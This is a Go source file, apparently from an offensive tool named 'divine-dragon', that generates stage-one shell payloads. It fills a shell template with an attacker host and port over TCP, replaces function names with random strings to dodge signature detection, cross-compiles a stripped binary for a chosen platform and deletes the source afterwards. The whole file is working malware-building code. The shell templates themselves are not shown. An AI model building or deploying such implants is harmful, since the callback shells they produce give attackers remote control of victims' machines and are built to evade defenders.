package payload_generator

import (
	"divine-dragon/util"
	"fmt"
	"os/exec"
	"strings"

	"github.com/gobuffalo/packr"
)

type StageOnePayloadGenerator struct {
	host           string
	port           string
	shellType      string
	platform       string
	arch           string
	executableName string

	logger util.Logger
}

func NewStageOnePayloadGenerator(hostOpt string, portOpt string, shellTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *StageOnePayloadGenerator {
	sopg := StageOnePayloadGenerator{
		host:           hostOpt,
		port:           portOpt,
		shellType:      shellTypeOpt,
		platform:       platformOpt,
		arch:           archOpt,
		executableName: executableNameOpt,
	}
	sopg.logger = util.StageOnePayloadGeneratorLogger(false, "")
	return &sopg
}

func (sopg *StageOnePayloadGenerator) Run() {
	payloadSource, err := sopg.preparePayloadSource()
	if err != nil {
		sopg.logger.Log.Error(err)
	}
	fmt.Println(payloadSource)
	err = sopg.compilePayload(payloadSource)
	if err != nil {
		sopg.logger.Log.Error(err)
	}
}

func (sopg *StageOnePayloadGenerator) preparePayloadSource() (string, error) {
	payloadSource, err := packr.NewBox("./templates/").FindString(sopg.shellType + ".go")
	if err != nil {
		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
	}
	connType := "tcp"
	payloadSource = strings.Replace(payloadSource, "HOST", sopg.host, -1)
	payloadSource = strings.Replace(payloadSource, "PORT", sopg.port, -1)
	payloadSource = strings.Replace(payloadSource, "CONN_TYPE", connType, -1)
	funcPatterns := []string{"FUNC_DELETE", "FUNC_HANDLE"}
	for _, funcPattern := range funcPatterns {
		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
	}
	return payloadSource, nil
}

func (sopg *StageOnePayloadGenerator) compilePayload(payloadSource string) error {
	payloadSourceFileName := util.RandString(util.RandInt()) + ".go"
	err := util.WriteToFile(payloadSourceFileName, payloadSource)
	if err != nil {
		return err
	}
	out, err := exec.Command("env",
		fmt.Sprintf("GOOS=%s", sopg.platform),
		fmt.Sprintf("GOARCH=%s", sopg.arch),
		"go",
		"build",
		"-o",
		sopg.executableName,
		"-ldflags",
		"-w -s",
		payloadSourceFileName).Output()
	if err != nil {
		return err
	}
	if string(out) != "" {
		return fmt.Errorf("can't compile a binary: %s", string(out))
	}
	err = util.RemoveFile(payloadSourceFileName)
	if err != nil {
		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
	}
	return nil
}
